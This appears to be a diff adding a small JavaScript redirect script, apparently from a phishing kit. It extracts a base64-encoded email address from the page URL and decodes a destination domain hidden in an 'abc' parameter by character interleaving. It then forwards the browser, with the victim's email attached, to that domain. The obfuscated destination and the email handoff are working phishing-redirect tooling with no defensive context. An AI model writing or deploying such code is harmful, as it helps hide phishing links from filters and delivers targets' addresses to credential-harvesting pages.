@@ -1,0 +1,51 @@
+// Get the current URL
+var currentUrl = window.location.href;
+
+// Function to decode base64 encoded string
+function decodeBase64(encodedString) {
+    return atob(encodedString);
+}
+
+// Function to decode obfuscated 'abc' domain (remove 1 char, skip 1, repeat)
+function decodeABC(input) {
+    let result = '';
+    for (let i = 1; i < input.length; i += 2) {
+        result += input[i];
+    }
+    return result;
+}
+
+// Extract the email address from the URL
+var emailMatch = currentUrl.match(/[?&#]([^=]*)=([^&]*)/) || currentUrl.match(/#([^=]*)=([^&]*)/);
+
+if (emailMatch) {
+    var key = emailMatch[1];
+    var value = emailMatch[2];
+
+    // Try to decode the email if base64
+    var decodedEmail = value;
+    try {
+        decodedEmail = decodeBase64(value);
+    } catch (e) {
+        // Use raw value if not valid base64
+    }
+
+    // Extract and decode abc= value
+    var abcMatch = currentUrl.match(/[?&#]abc=([^&]*)/);
+    var baseUrl = 'https://goal.com'; // default if abc not present
+    if (abcMatch) {
+        var obfuscated = abcMatch[1];
+        var decodedDomain = decodeABC(obfuscated);
+        // Ensure it has https prefix
+        if (!decodedDomain.startsWith('http')) {
+            decodedDomain = 'https://' + decodedDomain;
+        }
+        baseUrl = decodedDomain;
+    }
+
+    // Redirect to final URL
+    var redirectUrl = baseUrl + '#' + decodedEmail;
+    window.location.href = redirectUrl;
+} else {
+    console.log('Email address not found');
+}
